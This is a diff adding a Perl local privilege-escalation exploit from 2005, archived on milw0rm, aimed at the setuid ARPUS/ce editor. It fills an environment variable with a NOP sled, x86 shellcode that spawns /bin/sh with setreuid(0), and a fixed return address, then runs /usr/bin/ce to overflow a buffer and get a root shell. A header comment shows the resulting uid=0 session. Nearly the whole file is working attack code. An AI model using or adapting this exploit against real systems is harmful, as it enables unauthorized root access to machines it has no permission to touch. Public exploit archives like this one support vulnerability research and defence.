@@ -1,0 +1,28 @@
+#!/usr/bin/perl -w
+#
+# Setuid ARPUS/ce exploit by KF - kf_lists[at]digitalmunition[dot]com - 4/21/05
+#
+# Copyright Kevin Finisterre
+# kfinisterre@threat:/tmp$ ./ce_ex.pl
+# sh-2.05b# id
+# uid=0(root) gid=1000(kfinisterre)
+# groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),1000(kfinisterre)
+#
+
+# 57 bytes long
+$sc  = "\x90"x512;
+$sc .= "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80";
+$sc .= "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b";
+$sc .= "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd";
+$sc .= "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+$buf = "\x90" x (4120-569);
+$buf .= $sc;
+$buf .= (pack("l",(0xbfffa187)) x2);
+
+$ENV{"XAPPLRESLANGPATH"} = $buf;
+
+exec("/usr/bin/ce"); 
+
+
+# milw0rm.com [2005-05-01]
